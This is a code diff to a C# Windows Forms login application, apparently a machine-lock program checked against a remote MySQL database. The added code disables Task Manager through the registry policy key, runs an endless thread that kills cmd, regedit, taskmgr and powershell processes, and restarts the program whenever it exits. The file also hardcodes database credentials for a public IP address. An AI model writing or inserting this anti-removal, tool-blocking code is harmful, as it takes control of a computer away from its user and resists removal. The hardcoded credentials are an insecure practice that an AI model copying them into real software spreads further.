@@ -16,6 +16,7 @@ using System.Security.Cryptography;
 using System.Net.Sockets;
 using System.Net;
 using System.Diagnostics;
+using Microsoft.Win32;
 
 
 namespace DA_RSA
@@ -25,7 +26,8 @@ namespace DA_RSA
         MySqlConnection conn1;
         bool logged = false;
         EndPoint server;
-        Thread ListenerThread;
+        Thread ListenerThread, BlThread;
+        string[] blacklist;
         
 
         public Form1()
@@ -33,9 +35,18 @@ namespace DA_RSA
             InitializeComponent();
             notifyIcon1.Visible = true;
             Application.ApplicationExit += Application_ApplicationExit;
+            Application.ApplicationExit += new EventHandler(this.OnAppExit);
             conn1 = new MySqlConnection(@"server='213.47.71.253';database='rsa';uid='rsa';pwd='rsa'");
             ListenerThread = new Thread(Receive);
             ListenerThread.Start();
+            ParameterizedThreadStart pts = new ParameterizedThreadStart(blacklisten);
+            BlThread = new Thread(pts);
+            blacklist = new string[] { "cmd", "regedit", "taskmgr", "powershell" };
+            BlThread.Start(blacklist);
+
+            UInt32 m;
+            UInt32.TryParse("1", out m);
+            Write("DisableTaskMgr", m);
         }
 
         public void Receive()
@@ -61,6 +72,37 @@ namespace DA_RSA
                     {
                         this.Show();
                     }
+                }
+            }
+        }
+
+        public void blacklisten(object o)
+        {
+            string[] bl = (string[])o;
+
+            while (true)
+            {
+                Process[] p = Process.GetProcesses();
+
+                foreach (string s in bl)
+                {
+                    foreach (Process x in p)
+                    {
+                        if (s == x.ProcessName)
+                        {
+                            try
+                            {
+                                x.Kill();
+                                break;
+                            }
+                            catch (Exception)
+                            {
+                                break;
+                            }
+                        }
+                    }
+
+                    p = Process.GetProcesses();
                 }
             }
         }
@@ -166,6 +208,11 @@ namespace DA_RSA
             }
         }
 
+        private void OnAppExit(object sender, EventArgs e)
+        {
+            Application.Restart();
+        }
+
         static string GetMd5Hash(string input)
         {
             MD5 md5Hash = MD5.Create();
@@ -198,6 +245,31 @@ namespace DA_RSA
             if (logged == false)
             {
                 this.Show();
+            }
+        }
+
+        public void Write(string KeyName, UInt32 Value)
+        {
+            try
+            {
+                // Setting
+                RegistryKey rk = Registry.CurrentUser;
+                // I have to use CreateSubKey 
+                // (create or open it if already exits), 
+                // 'cause OpenSubKey open a subKey as read-only
+                RegistryKey sk1 = rk.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\");
+                // Save the value
+
+                sk1.SetValue(KeyName, Value, RegistryValueKind.DWord);
+
+                //return Convert.ToString(sk1.GetValue(KeyName));
+
+            }
+            catch (Exception e)
+            {
+                // AAAAAAAAAAARGH, an error!
+                MessageBox.Show("Writing registry " + KeyName.ToUpper());
+                //return "...";
             }
         }
 
